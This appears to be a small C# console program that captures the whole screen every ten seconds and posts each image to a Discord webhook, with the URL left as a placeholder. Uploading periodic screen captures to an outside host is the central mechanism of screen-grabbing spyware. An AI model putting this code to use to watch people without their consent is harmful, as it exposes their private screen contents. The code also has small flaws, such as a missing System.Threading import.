using System;
using System.Drawing;
using System.IO;
using System.Net.Http;
using System.Threading.Tasks;
using System.Runtime.InteropServices;

class Program
{
    static void Main()
    {
        // Discord webhook URL
        string webhookUrl = "<YOUR WEBHOOK>";

        // Create a timer to take screenshots every 10 seconds
        Timer timer = new Timer(TakeAndSendScreenshot, webhookUrl, 0, 10 * 1000);

        // Keep the application running
        Console.WriteLine("Press Enter to exit.");
        Console.ReadLine();

        // Dispose of the timer
        timer.Dispose();
    }

    static void TakeAndSendScreenshot(object state)
    {
        string webhookUrl = (string)state; // Unwrap state

        try
        {
            // Capture the full screen screenshot
            byte[] screenshot = ConsoleCapture.CaptureFullScreen();

            // Send the screenshot to the Discord webhook
            SendScreenshotToDiscord(webhookUrl, screenshot).Wait();
        }
        catch (Exception ex)
        {
            Console.WriteLine($"Error taking or sending screenshot: {ex.Message}");
        }
    }

    static async Task SendScreenshotToDiscord(string webhookUrl, byte[] screenshot)
    {
        using (HttpClient client = new HttpClient())
        {
            MultipartFormDataContent content = new MultipartFormDataContent();
            ByteArrayContent imageContent = new ByteArrayContent(screenshot);

            content.Add(imageContent, "file", "screenshot.png");

            // Send a simple message along with the screenshot
            content.Add(new StringContent("Screenshot from Console App"), "content");

            // Send the screenshot to Discord
            var response = await client.PostAsync(webhookUrl, content);

            if (response.IsSuccessStatusCode)
            {
                Console.WriteLine("Screenshot sent to Discord successfully.");
            }
            else
            {
                Console.WriteLine($"Error sending screenshot to Discord. Status code: {response.StatusCode}");
            }
        }
    }
}

class ConsoleCapture
{
    public static byte[] CaptureFullScreen()
    {
        // Capture the entire primary screen
        Rectangle bounds = GetVirtualScreenBounds();

        using (Bitmap screenshot = new Bitmap(bounds.Width, bounds.Height))
        {
            using (Graphics graphics = Graphics.FromImage(screenshot))
            {
                graphics.CopyFromScreen(bounds.Left, bounds.Top, 0, 0, bounds.Size);
            }

            // Convert the screenshot to a byte array
            using (MemoryStream stream = new MemoryStream())
            {
                screenshot.Save(stream, System.Drawing.Imaging.ImageFormat.Png);
                return stream.ToArray();
            }
        }
    }

    private static Rectangle GetVirtualScreenBounds()
    {
        int screenWidth = GetSystemMetrics(SM_CXVIRTUALSCREEN);
        int screenHeight = GetSystemMetrics(SM_CYVIRTUALSCREEN);

        return new Rectangle(0, 0, screenWidth, screenHeight);
    }

    // P/Invoke declarations for screen metrics
    const int SM_CXVIRTUALSCREEN = 78;
    const int SM_CYVIRTUALSCREEN = 79;

    [DllImport("user32.dll")]
    static extern int GetSystemMetrics(int nIndex);
}

class Timer : IDisposable
{
    private readonly System.Threading.Timer timer;
    private readonly object state;

    public Timer(TimerCallback callback, object state, int dueTime, int period)
    {
        this.state = state;
        timer = new System.Threading.Timer(callback, state, dueTime, period);
    }

    public void Dispose()
    {
        timer.Dispose();
    }
}
